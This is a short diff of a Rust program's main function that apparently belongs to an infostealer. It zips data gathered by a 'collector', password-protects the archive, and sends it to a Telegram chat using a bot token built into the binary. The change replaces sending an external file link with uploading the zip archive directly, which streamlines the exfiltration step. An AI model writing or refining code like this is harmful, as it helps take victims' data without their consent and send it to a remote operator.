@@ -60,7 +60,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     // let _ = StorageFileSystem.write_file(&out, &zip);
 
     TelegramBot::new(Arc::from(env!("TELEGRAM_CHAT_ID")), Arc::from(env!("TELEGRAM_BOT_TOKEN")))
-        .send(LogFile::ExternalLink(("https://sexy.files/file.zip".to_string(), 2931usize)), Some(password), &collector)
+        .send(LogFile::ZipArchive(zip), Some(password), &collector)
         .unwrap();
 
     0
